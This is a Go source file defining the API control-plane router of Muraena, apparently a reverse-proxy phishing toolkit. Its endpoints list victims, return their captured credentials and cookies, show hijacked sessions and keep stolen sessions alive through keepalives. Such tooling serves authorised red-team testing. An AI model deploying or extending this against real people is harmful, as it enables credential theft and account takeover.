package api

import (
	"fmt"
	"net/http"

	"github.com/go-chi/chi/v5"

	"github.com/muraenateam/muraena/api/auth"
	"github.com/muraenateam/muraena/core"
	"github.com/muraenateam/muraena/log"
	"github.com/muraenateam/muraena/session"
)

type Server struct {
	sess *session.Session
}

func New(sess *session.Session) *Server { return &Server{sess: sess} }

func (s *Server) Router() http.Handler {
	r := chi.NewRouter()
	r.Use(RequestID, Recover)

	r.Route("/api/v1", func(r chi.Router) {
		r.Get("/healthz", func(w http.ResponseWriter, _ *http.Request) {
			writeJSON(w, 200, map[string]string{"status": "ok", "version": core.Version})
		})

		r.Post("/auth/login", s.handleLogin)
		r.Post("/auth/refresh", s.handleRefresh)

		r.Group(func(r chi.Router) {
			r.Use(RequireAuth())
			r.Post("/auth/logout", s.handleLogout)
			r.Get("/me", s.handleMe)

			r.Get("/victims", s.handleListVictims)
			r.Get("/victims/{id}", s.handleGetVictim)
			r.Get("/victims/{id}/credentials", s.handleVictimCredentials)
			r.Get("/victims/{id}/cookies", s.handleVictimCookies)
			r.Get("/sessions/hijacked", s.handleHijacked)
			r.Get("/sessions/instrumented", s.handleInstrumented)
			r.Get("/keepalives", s.handleListKeepalives)
		})

		r.Group(func(r chi.Router) {
			r.Use(RequireAuth("admin"))
			r.Get("/users", s.handleListUsers)
			r.Post("/users", s.handleCreateUser)
			r.Delete("/users/{name}", s.handleDeleteUser)
			r.Get("/settings", s.handleGetSettings)
			r.Put("/settings", s.handlePutSettings)
			r.Get("/config", s.handleGetConfig)
			r.Patch("/config", s.handlePatchConfig)
			r.Post("/config/reload", s.handleReloadConfig)
			r.Post("/config/import", s.handleImportConfig)
			r.Get("/config/restart-fields", s.handleRestartFields)

			r.Delete("/victims/{id}", s.handleDeleteVictim)
			r.Post("/victims/{id}/instrument", s.handleForceInstrument)

			r.Post("/keepalives", s.handleCreateKeepalive)
			r.Delete("/keepalives/{id}", s.handleDeleteKeepalive)
			r.Post("/victims/{id}/keepalive", s.handleKeepaliveNow)
		})
	})
	return r
}

// Run starts the API server. No-op when the API is disabled.
func Run(sess *session.Session) {
	if !sess.Config().Api.Enable {
		log.Debug("API control plane disabled")
		return
	}
	if err := auth.Bootstrap(); err != nil {
		log.Error("API bootstrap failed: %s", err)
		return
	}
	srv := New(sess)
	addr := fmt.Sprintf("%s:%d", sess.Config().Api.Bind, sess.Config().Api.Port)
	log.Info("API control plane listening on %s", addr)
	if err := http.ListenAndServe(addr, srv.Router()); err != nil {
		log.Error("API server error: %s", err)
	}
}
